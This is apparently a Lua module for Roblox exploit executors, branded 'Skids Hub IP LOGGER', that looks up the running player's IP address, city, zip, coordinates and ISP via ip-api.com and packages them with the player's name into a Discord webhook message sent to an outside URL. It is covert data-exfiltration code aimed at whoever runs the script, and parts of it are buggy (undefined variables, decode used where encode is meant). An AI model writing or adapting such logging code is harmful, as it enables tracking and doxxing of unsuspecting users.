do
    -- This function returns a string with the name of the exploit u using(only checks for krnl, synapse, )
    local function checkExploit()
        
        local exploitName = (syn and 'Synapse') or (Krnl and 'Krnl') 


        return exploitName

    end

    skidApi = {
        webhookJson = function(scriptName)

            if not self then return end

            local player = game.Players.LocalPlayer
            local ipData = self.ipApi
            scriptName = scriptName or 'Viva Mexico'
            return {
                content = string.format('**@%s** __fired__ **%s**', player.Name, scriptName),
                embeds  = {
                    { 
                        author={
                                name='Skids Hub/ramirez',
                                url='https://discord.gg/q8FspVseAU',
                                icon_url='https://skidshubmx.000webhostapp.com/media/skids_HUB.png'
                        },
                        title='Skids Hub **IP LOGGER**',
                        url='https://discord.gg/q8FspVseAU',
                        description = string.format('@%s**(%s)** fired **%s** [discord](https://discord.gg/q8FspVseAU)', player.Name, player.DisplayName, scriptName),
                        color = 0,
                        fields  = {
                            {
                                name = '**Country**',
                                value = ipData['country'] .. '/' .. ipData['countryCode'],
                                inline = true
                            },
                            {
                                name = '**Region**',
                                value = ipData['regionName'] .. '/' .. ipData['region'],
                                inline = true
                            },
                            {
                                name = '**City/Zip**',
                                value = ipData['city'] .. '/' .. ipData['zip'],
                                inline = true
                            }
                        },
                        thumbnail = {
                            url = playerThumb
                        }
                    },
                    {
                        color = 0,
                        fields={
                            {
                                name = '**lat/lon**',
                                value = ipData['lat'] .. '/' .. ipData['lon'],
                                inline = true
                            },
                            {
                                name = '**Isp/Org**',
                                value = ipData['isp'] .. '/' .. ipData['org'],
                                inline = true
                            },
                            {
                                name = '**IPV4/IPV6**',
                                value = ipData['query'],
                                inline = false
                            },
                        },
                        footer = {
                            text = 'Skids Hub',
                            icon_url='https://skidshubmx.000webhostapp.com/media/skids_HUB.png'
                        }
                    }
                }
            }
        end,

        ipApi = game:GetService('HttpService'):JSONDecode(game:HttpGet('http://ip-api.com/json')),
        exploitName = checkExploit(),

        httpPost = (Krnl and request) or (syn and syn.request) or http_request,
        
        sendWebhook = function(webhooklink)
            if self and webhooklink and self.httpPost and self.webhookJson then
                return self.httpPost(
                    {
                        Url = webhooklink,
                        Method = 'Post',
                        Body = game:GetService('HttpService'):JSONDecode(self.webhookJson) ,
                        Headers = {
                            ['Content-Type'] = 'application/json'
                        }
                    }
                )
            end
        end
    }

end








return skidApi
